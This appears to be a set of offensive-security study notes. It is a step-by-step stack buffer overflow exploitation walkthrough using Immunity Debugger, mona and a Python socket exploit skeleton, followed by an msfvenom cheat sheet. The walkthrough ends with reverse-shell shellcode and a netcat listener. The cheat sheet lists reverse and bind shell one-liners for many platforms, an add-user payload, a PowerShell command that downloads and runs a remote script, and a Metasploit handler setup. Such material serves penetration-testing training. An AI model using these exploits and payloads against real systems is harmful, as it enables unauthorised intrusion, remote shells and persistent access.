# Fuzzing

Use fuzzer.py or fuzzer2.py, until the application crash inside Immunity Debugger. Fuzzing a program to make it crash:

- [Fuzzer 1](offensive/code/fuzzer1.py)
- [Fuzzer 2](offensive/code/fuzzer2.py)

You just have to modify those two variables of the scripts above :

- IP
- PORT When the application crashes, EIP should be equal to 41414141 (hex value of "AAAA").

Setting up `mona.py` program working forlder `!mona config -set workingfolder C:\Program Files (x86)\Immunity Inc\Immunity Debugger\%p`

# Crash replication & controlling EIP

## Pattern

We can generate a cyclic pattern to find the exact offset of the crash with or you can use metasploit to do the job:

```
# Mona
!mona pc <SIZE>

# Metasploit
msf-pattern_create -l <SIZE>
```

The size must be higher than the crash offset. Now modify the payload variable by the cyclic pattern :

```
##!/usr/bin/env python3
# exploit.py

import socket
ip = "<IP>"
port = <PORT>

prefix = ""
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")
```

Re-run the exploit, the application should crash. To find the exact offset of the crash use:<br>
`!mona findmsp -distance <SIZE>` Size is the same as the one used to create the pattern. The result should be something like:<br>
`EIP contains normal pattern : ... (offset XXXX)` Get the offset, modify in exploit.py:

- The `offset` variable by the offset
- The `retn` variable by "BBBB"
- Remove the **payload** variable

```
offset = <OFFSET>
overflow = "A" * offset
retn = "BBBB"
payload = ""
```

Re-run `exploit.py`, EIP should be equal to 42424242 (hex value of "BBBB"). You now control EIP!

# Finding bad characters

Certain byte characters can cause issues in the development of exploits. We must run every byte through the program to see if any characters cause issues. By default, the null byte (\x00) is always considered a bad character as it will truncate shellcode when executed. We will send bad characters recursively and analyze if they need to be removed. Let generate the list of bad characters with mona: `!mona bytearray -b "\x00"`

Copy the results in the variable payload. And re-run exploit.py, the application should crash. Now to found those bad characters use this command : `!mona compare -f C:\mona\<PATH>\bytearray.bin -a <ESP_ADDRESS>`

If BadChars are found, we need to exclude them as well.

```
!mona bytearray -b "\x00 + <BAD_CHARS>"
# Example
!mona bytearray -b "\x00\x01\x02\x03"
```

Then compare again : `!mona compare -f C:\mona\<PATH>\bytearray.bin -a <ESP_ADDRESS>` Repeat those two steps until the results status returns Unmodified, this indicates that no more bad characters exist.

# Finding a jump point

## JMP ESP - Inside the .exe

`!mona jmp -r esp -cpb "<BAD_CHARS>"`

## JMP ESP - inside a DLL

`!mona modules` We need to found a .dll were Rebase, SafeSEH, ASLR, NXCompat are sets to False. When you found it, run the command below to search for a JMP ESP (FFE4), inside the dll: `!mona find -s "\xff\xe4" -m <DLL>`

## Return address

Choose an address in the results and update `exploit.py`:

- Setting the retn variable to the address, written backwards (little-endian) ```

  # Example of a JMP ESP address

   0x625011af

# exploit.py

retn = "\xaf\x11\x50\x62"

```

## Generate payload
Now we generate our shellcode without the badchars that we found:
`msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -b "<BAD_CHARS>" -f c`
Copy the generated shellcode and update exploit.py :
- Setting the payload variable equal to the shellcode
## Prepend NOPs
A NOP-sled is a technique for exploiting stack buffer overflows. It solves the problem of finding the exact address of the buffer by effectively increasing the size of the target area, \x90 represents a NOP in assembly. This instruction will literally do nothing and continue on with code execution.
`padding = "\x90" * 16`
Start a listener
`nc -lvp <PORT>`

MSFvenom Oneliners

# MSFVenom Cheatsheet
Single Page Cheatsheet for common MSF Venom One Liners  
Available in PDF, DOCX and Markdown format!
*PDF and DOCX versions contain the payload size in bytes and a few more commands.*

# MSFVenom Cheatsheet

| MSFVenom Payload Generation One-Liner | Description |
|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------|
|    msfvenom -l   payloads                                                                                                                                                                 |    List available payloads                                     |
|    msfvenom -p PAYLOAD --list-options                                                                                                                                                                 |    List payload options                                     |
|    msfvenom -p   PAYLOAD -e ENCODER -f FORMAT -i ENCODE COUNT   LHOST=IP                                                                                                        |    Payload Encoding                                            |
|    msfvenom -p   linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf  >  shell.elf                                                                                           |    Linux Meterpreter  reverse shell x86 multi stage            |
|    msfvenom -p   linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf  >  shell.elf                                                                                              |    Linux Meterpreter  bind shell x86 multi stage               |
|    msfvenom -p linux/x64/shell_bind_tcp   RHOST=IP LPORT=PORT -f elf > shell.elf                                                                                                      |    Linux bind shell x64 single stage                           |
|    msfvenom -p linux/x64/shell_reverse_tcp   RHOST=IP LPORT=PORT -f elf > shell.elf                                                                                                   |    Linux reverse shell x64 single stage                        |
|    msfvenom -p   windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe >   shell.exe                                                                                             |    Windows Meterpreter reverse shell                           |
|    msfvenom -p   windows/meterpreter_reverse_http LHOST=IP LPORT=PORT HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" -f exe > shell.exe                                                                                             |    Windows Meterpreter http reverse shell                           |
|    msfvenom -p   windows/meterpreter/bind_tcp RHOST= IP LPORT=PORT -f exe >   shell.exe                                                                                               |    Windows Meterpreter bind shell                              |
|    msfvenom -p   windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe >   shell.exe                                                                                                   |    Windows CMD Multi Stage                                     |
|    msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT   -f exe >  shell.exe                                                                                                     |    Windows CMD Single Stage                                    |
|    msfvenom -p   windows/adduser USER=hacker PASS=password -f exe > useradd.exe                                                                                                           |    Windows add user                                            |
|    msfvenom -p   osx/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f macho >   shell.macho                                                                                               |    Mac Reverse Shell                                           |
|    msfvenom -p   osx/x86/shell_bind_tcp RHOST=IP LPORT=PORT -f macho  >  shell.macho                                                                                                  |    Mac Bind shell                                              |
|    msfvenom -p   cmd/unix/reverse_python LHOST=IP LPORT=PORT -f raw >   shell.py                                                                                                      |    Python Shell                                                |
|    msfvenom -p   cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw >   shell.sh                                                                                                        |    BASH Shell                                                  |
|    msfvenom -p   cmd/unix/reverse_perl LHOST=IP LPORT=PORT -f raw >   shell.pl                                                                                                        |    PERL Shell                                                  |
|    msfvenom -p   windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp >   shell.asp                                                                                             |    ASP Meterpreter shell                                       |
|    msfvenom -p   java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw  >  shell.jsp                                                                                                  |    JSP Shell                                                   |
|    msfvenom -p   java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war >   shell.war                                                                                                  |    WAR Shell                                                   |
|    msfvenom -p   php/meterpreter_reverse_tcp LHOST=IP LPORT=PORT -f raw  >  shell.php   cat shell.php | pbcopy && echo '?php ' | tr -d '\n'    shell.php && pbpaste  shell.php    |    Php Meterpreter Shell                                       |
|    msfvenom -p   php/reverse_php LHOST=IP LPORT=PORT -f raw  >  phpreverseshell.php                                                                                                   |    Php Reverse Shell                                           |
|    msfvenom -a x86   --platform Windows -p windows/exec CMD="powershell \\"IEX(New-Object   Net.webClient).downloadString('http://IP/nishang.ps1')\""   -f python                        |    Windows Exec Nishang Powershell in   python   |
|    msfvenom -p   windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT   -f c -e x86/shikata_ga_nai -b "\x04\xA0"                                                            |    Bad characters shikata_ga_nai                               |
|    msfvenom -p   windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT   -f c -e x86/fnstenv_mov -b "\x04\xA0"                                                               |    Bad characters fnstenv_mov                                  |

# Multihandler Listener
To get multiple session on a single multi/handler, you need to set the ExitOnSession option to false and run the exploit -j instead of just the exploit. For example, for meterpreter/reverse_tcp payload,
```

msf>use exploit/multi/handler<br>
msf>set payload windows/meterpreter/reverse_tcp<br>
msf>set lhost 

<ip><br>msf&gt;set lport <port><br>msf&gt; set ExitOnSession false<br>msf&gt;exploit -j<br>```
The -j option is to keep all the connected session in the background.  </port></ip>

# References

<https://kb.help.rapid7.com/discuss/598ab88172371b000f5a4675><br>
<https://thor-sec.com/cheatsheet/oscp/msfvenom_cheat_sheet/><br>
<http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/>
